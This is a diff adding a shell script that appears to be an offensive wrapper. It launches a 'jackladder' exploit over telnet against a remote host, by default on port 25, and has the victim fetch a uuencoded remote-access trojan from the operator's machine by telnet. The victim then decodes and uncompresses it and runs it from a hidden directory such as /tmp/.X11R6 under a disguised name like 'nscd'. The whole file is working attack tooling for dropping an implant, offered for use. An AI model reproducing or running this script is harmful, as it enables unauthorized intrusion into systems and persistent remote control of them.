@@ -1,0 +1,109 @@
+#!/bin/sh
+usage () {
+    echo ""
+    echo "Usage: ${0} <rem_ip> <loc_ip> <localport> <targetdir> <rat_file> [<jl_port>] [<rat_port> <rat_name>]"
+    echo "   jl is assumed to be in ./jl"
+    echo "   jl_port defaults to 25"
+    echo "   rat_port optional - default used if not given, but if"
+    echo "          rat_port given, rat_name must be nosy or nopen"
+    echo "   e.g. ${0} alice LOCALIP 32177 /tmp/.X11R6 nscd"
+    echo "   e.g. ${0} alice LOCALIP 32177 /tmp/.X11R6 nscd 13 33433 nosy"
+    echo ""
+    exit
+}
+case "${#}" in
+    0|1|2|3|4|7)
+    usage
+    ;;
+esac
+
+REMOTEIP=$1
+LOCALIP=$2
+LOCALPORT=$3
+TARGETDIR=$4
+RAT_FILE=$5
+JLPORT=$6
+RAT_PORT=$7
+RAT_NAME=$8
+
+if [ "$JLPORT" = "" ]; then
+  JLPORT=25
+fi
+if [ "$RAT_PORT" != "" ]; then 
+  if [ "$RAT_NAME" = "" ]; then
+    echo You must supply rat_name with rat_port
+    echo ""
+    usage
+  fi
+  if [ $RAT_PORT -lt 1025 -o $RAT_PORT -gt 65535 ]; then
+    echo rat_port must be between 1025 and 65535, inclusive
+    echo ""
+    usage
+  fi
+  if [ "$RAT_NAME" = "nosy" ]; then
+    RAT_ARG="P=$RAT_PORT "
+  else
+    if [ "$RAT_NAME" = "nopen" ]; then
+	RAT_ARG="C=\"-l $RAT_PORT\" "
+    else
+	echo rat_name $RAT_NAME is not nosy or nopen
+	echo ""
+	usage
+    fi
+  fi
+else
+  RAT_ARG=""
+fi
+
+if [ ! "$RA" = "" ]; then
+    echo "RA=\"$RA\""
+fi
+if [ ! "$RP" = "" ]; then
+    echo "RP=\"$RP\""
+fi
+
+echo CommandLine: ${0} ${*}
+
+#1 on line below is for F version. Use 2 for D version
+REALCMD="N=/dev/null
+D=$TARGETDIR
+PATH=\$D:/bin:/usr/bin:/sbin:/usr/sbin:/usr/bsd
+mkdir \$D
+cd \$D
+telnet $LOCALIP $LOCALPORT | cat > $RAT_FILE.uu
+uudecode $RAT_FILE.uu
+if [ ! -f $RAT_FILE.Z ]; then
+  telnet $LOCALIP 80
+fi
+uncompress -f $RAT_FILE.Z 
+chmod 777 $RAT_FILE 
+PATH=\$D ${RAT_ARG}${RAT_FILE}
+exit 0"
+export REALCMD
+
+echo ""
+echo ""
+echo "CHECK SYNTAX IN REALCMD AND IN jl.command LINE BEFORE CONTINUING"
+echo ""
+echo "New order of arguments is: "
+echo "<rem_ip> <loc_ip> <localport> <targetdir> <rat_file> <jl_port> <rat_port> <rat_name>"
+echo ""
+
+echo "REALCMD=\"$REALCMD\""
+echo ""
+echo "Command about to be executed:"
+echo " ./jl.command telnet $REMOTEIP $JLPORT"
+echo ""
+PLATFORM=`uname`
+if [ "$PLATFORM" = "Linux" ]; then
+  MINUSN=-n
+else
+  MINUSN=""
+fi
+echo $MINUSN "Hit enter to proceed, ^C to not: "
+
+read junk
+
+#now run jackladder
+
+./jl.command telnet $REMOTEIP $JLPORT
